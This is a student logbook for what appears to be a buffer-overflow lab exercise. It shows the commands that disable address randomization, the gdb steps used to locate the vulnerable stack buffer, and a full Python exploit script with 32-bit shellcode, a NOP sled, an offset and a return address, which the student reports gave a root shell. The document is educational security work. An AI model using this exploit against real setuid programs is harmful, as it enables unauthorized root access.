# Logbook 5 

## Environment Setup 

First, we turn off some of the operating system's protections using the commands that are given (sudo sysctl -w kernel.randomize_va_space=0 and sudo ln -sf /bin/zsh /bin/sh). 

![Alt text](images/1.png)

## Task 1 

In 3.1 we created a file with the given C code and then compile and execute the program and conclude that will open a new shell. 

In 3.2 we just analyzed and tried to understand how the shellcode given invokes the execve() system call to execute /bin/sh. 

In 3.3 is just to understand how the 64-bit shell works.

In 3.4 we went to the past shellcode and compiled the file with help of the Makefile already given and then execute the a32.out and the a64.out. 

![Alt text](images/2.png)

![Alt text](images/3.png)

We conclude that both files generate a shellcode. 

## Task 2

In this task we compiled the program with the commands given. 

![Alt text](images/4.png)

After analyzing the code, we noticed the attempt to copy a char array with a maximum size of 517 bytes into a buffer with a maximum size of 100 bytes so overflow will occur because the function strcpy doesn’t check the limits of the buffer.   

## Task 3

In 5.1 we create an empty file (badfile) and run the code with a debugging method in order to discover the starting position and the place where the return-address is stored. To do this, we used gdb to debug and put a breakpoint in the bof() function following the instructions given in the task.

$ touch badfile # Create empty badfile

$ gdb stack-L1-dbg # Run the program in debug mode

gdb-peda$ b bof # Set a breakpoint in the bof function

![Alt text](/images/Logbook5-1.png)

gdb-peda$ run # Start executing the file

![Alt text](/images/Logbook5-2.png)

![Alt text](/images/Logbook5-3.png)

gdb-peda$ next # See the note below

![Alt text](/images/Logbook5-4.png)

![Alt text](/images/Logbook5-5.png)

gdb-peda$ p $ebp # Get the ebp value 

$1 = (void *) 0xffffdfd8

![Alt text](/images/Logbook5-6.png)

gdb-peda$ p &buffer # Get the buffer’s address 

$2 = (char (*)[100]) 0xffffdfac

![Alt text](/images/Logbook5-7.png)

In 5.2: 

First, we change the shell_code in exploit file for the 32 bits shell code (given in the previous tasks). 
We put our start to 490 because the buffer has a size of 517 and our shell has a size of 27 bytes, so 517-27=490.

```python
#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode= (
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80"
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

##################################################################
# Put the shellcode somewhere in the payload
start = 490               # Change this number 
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and put it somewhere in the payload
ret    = 0xFFFFCB96     # Change this number 
offset = 112            # Change this number 

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
```

To test this we open terminal where exploit.py and stack_l1 is located and run the exploit.py file and then the stack-L1. We got access to the rootshell as you can see in the print below, so we know it worked properly.

![Alt text](/images/Logbook5-8.png)
